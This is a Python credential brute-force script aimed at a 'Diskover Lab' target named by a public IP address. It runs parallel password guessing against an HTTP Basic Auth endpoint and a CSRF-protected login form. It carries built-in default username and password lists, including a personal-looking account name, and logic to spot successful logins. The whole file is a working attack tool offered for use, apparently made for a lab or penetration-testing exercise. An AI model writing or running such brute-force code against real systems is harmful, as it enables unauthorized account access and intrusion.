#!/usr/bin/env python3
"""
Parallel HTTP-Basic-Auth + form-login brute force tailored for Diskover Lab.

Usage:
  python auth_brute.py -t https://54.185.155.123 --api /api/index.php \\
                       --login /login.php -w wordlist.txt --user admin
"""
from __future__ import annotations
import argparse, asyncio, base64, re, sys
from pathlib import Path

import httpx

DEFAULT_USERS = ["admin", "administrator", "root", "diskover", "license",
                 "bobby", "bobby.painter", "user", "test"]
DEFAULT_PASSWORDS = ["admin", "password", "admin123", "diskover", "Diskover",
                     "Diskover1", "Diskover123", "license", "License123",
                     "ChangeMe", "P@ssw0rd", "qwerty", "letmein", "12345678"]


async def basic_try(c: httpx.AsyncClient, url: str, u: str, p: str):
    creds = base64.b64encode(f"{u}:{p}".encode()).decode()
    r = await c.get(url, headers={"Authorization": f"Basic {creds}"})
    if r.status_code != 401:
        return (u, p, r.status_code, len(r.content),
                r.text[:200].replace("\n", " "))
    return None


async def form_try(c: httpx.AsyncClient, url: str, u: str, p: str):
    r0 = await c.get(url)
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r0.text)
    csrf = m.group(1) if m else ""
    r = await c.post(url,
                     data={"csrf_token": csrf, "username": u, "password": p},
                     cookies=r0.cookies)
    text = r.text or ""
    location = r.headers.get("location", "")
    if r.status_code in (302, 303) and "login" not in location.lower():
        return (u, p, r.status_code, len(r.content), f"REDIRECT to {location}")
    if (r.status_code == 200
            and "Please fill in your credentials" not in text
            and "Diskover License Admin Login" not in text):
        return (u, p, r.status_code, len(r.content),
                text[:200].replace("\n", " "))
    return None


async def main():
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-t", "--target", required=True,
                   help="Base URL e.g. https://54.185.155.123")
    p.add_argument("--api", help="Basic-Auth endpoint path (e.g. /api/index.php)")
    p.add_argument("--login", help="Form-login endpoint path (e.g. /login.php)")
    p.add_argument("-u", "--user", action="append",
                   help="Username candidate (repeatable)")
    p.add_argument("-w", "--wordlist", help="Password wordlist file (one per line)")
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--concurrency", type=int, default=15)
    args = p.parse_args()

    users = args.user or DEFAULT_USERS
    if args.wordlist:
        passwords = [ln.strip() for ln in Path(args.wordlist).read_text().splitlines()
                     if ln.strip() and not ln.startswith("#")]
    else:
        passwords = DEFAULT_PASSWORDS
    if not args.api and not args.login:
        print("[!] specify at least --api or --login", file=sys.stderr)
        sys.exit(2)

    base = args.target.rstrip("/")
    sem = asyncio.Semaphore(args.concurrency)

    async def gated_basic(c, u, p):
        async with sem:
            return await basic_try(c, base + args.api, u, p)

    async def gated_form(c, u, p):
        async with sem:
            return await form_try(c, base + args.login, u, p)

    print(f"[*] {len(users) * len(passwords)} candidate pairs")
    async with httpx.AsyncClient(verify=not args.insecure, timeout=8.0,
                                   follow_redirects=False) as c:
        if args.api:
            print(f"[*] BASIC-AUTH  →  {base}{args.api}")
            r = await asyncio.gather(*(gated_basic(c, u, p)
                                        for u in users for p in passwords))
            for h in (x for x in r if x):
                print(f"  [+]  {h[0]:25} : {h[1]:25} → {h[2]} {h[3]}B  {h[4]}")
        if args.login:
            print(f"[*] FORM-LOGIN  →  {base}{args.login}")
            for u in users:
                for p in passwords:
                    hit = await gated_form(c, u, p)
                    if hit:
                        print(f"  [+]  {hit[0]:25} : {hit[1]:25} → {hit[2]} "
                              f"{hit[3]}B  {hit[4]}")


if __name__ == "__main__":
    asyncio.run(main())
